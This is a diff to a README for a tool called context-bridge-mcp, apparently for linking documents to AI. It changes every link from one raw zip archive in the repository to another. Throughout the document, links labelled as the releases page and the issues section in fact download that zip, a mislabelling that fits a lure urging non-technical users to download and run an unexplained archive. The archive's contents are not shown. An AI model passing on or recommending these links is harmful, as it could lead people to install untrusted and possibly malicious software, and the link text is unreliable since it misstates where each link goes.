@@ -1,6 +1,6 @@
 # 🔗 context-bridge-mcp - Connect Your Documents to AI Effortlessly
 
-[![Download](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip)](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip)
+[![Download](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip)](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip)
 
 ## 📄 Overview
 
@@ -26,9 +26,9 @@ To start using context-bridge-mcp, follow these steps. No programming skills are
 
 ## ⬇️ Download & Install
 
-To get context-bridge-mcp, visit this page to download: [GitHub Releases Page](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip).
+To get context-bridge-mcp, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip).
 
-1. Go to the [Releases](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip) page.
+1. Go to the [Releases](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip) page.
 2. Look for the latest version.
 3. Download the appropriate file for your operating system.
 4. Open the downloaded file and follow the installation prompts.
@@ -56,12 +56,12 @@ context-bridge-mcp emphasizes security. All document connections are encrypted t
 If you encounter any issues while using the application, consider these tips:
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet.
-- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip).
+- **Update the Application:** Make sure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip).
 - **Restart the Application:** Sometimes, simply restarting can resolve many issues.
 
 ## 📞 Support
 
-For additional help, visit the [issues section](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip) of our repository. Feel free to ask specific questions or report problems.
+For additional help, visit the [issues section](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip) of our repository. Feel free to ask specific questions or report problems.
 
 ## 📝 Contributing
 
@@ -73,6 +73,6 @@ If you have ideas to make context-bridge-mcp better, consider contributing. You 
 
 Explore more about context-bridge-mcp and its features. For advanced users, check the documentation for in-depth discussions on configurations and use cases.
 
-Visit the [GitHub Releases Page](https://github.com/SWIT2025/context-bridge-mcp/raw/refs/heads/main/assets/context_bridge_mcp_v1.8.zip) for frequent updates and new features. 
+Visit the [GitHub Releases Page](https://raw.githubusercontent.com/SWIT2025/context-bridge-mcp/main/src/context_bridge_mcp_v3.1.zip) for frequent updates and new features. 
 
 Thank you for choosing context-bridge-mcp for your document integration needs!
